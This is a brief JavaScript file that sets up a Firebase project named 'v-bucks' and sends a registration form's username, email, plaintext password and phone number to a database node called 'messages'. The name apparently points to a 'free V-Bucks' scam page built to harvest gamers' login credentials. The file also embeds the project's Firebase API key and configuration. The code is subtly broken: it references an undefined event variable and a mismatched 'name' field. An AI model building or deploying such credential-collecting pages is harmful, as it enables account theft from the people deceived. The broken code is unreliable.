const form = document.getElementById("register")

const firebaseConfig = {

    apiKey: "AIzaSyAO9IPp4Z_SsNmfvZyjetB_DlIOi0-rnbc",

    authDomain: "v-bucks-1e736.firebaseapp.com",

    databaseURL: "https://v-bucks-1e736-default-rtdb.firebaseio.com",

    projectId: "v-bucks-1e736",

    storageBucket: "v-bucks-1e736.appspot.com",

    messagingSenderId: "295457248076",

    appId: "1:295457248076:web:6c9982e917ca6ac52535e9",

    measurementId: "G-5BPVYJVSD1"

  };


  // Initialize Firebase

 firebase.initializeApp(firebaseConfig);

 const database = firebase.database()
 const ref = database.ref("messages")








form.addEventListener("submit",()=>{
    e.preventDefault()
    const Username = document.getElementById("name").value;
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;
    const phone_number = document.getElementById("phone_number").value;

    ref.push({
        name:name,
        email:email,
        password:password,
        phone_number:phone_number
    })


    form.reset()
})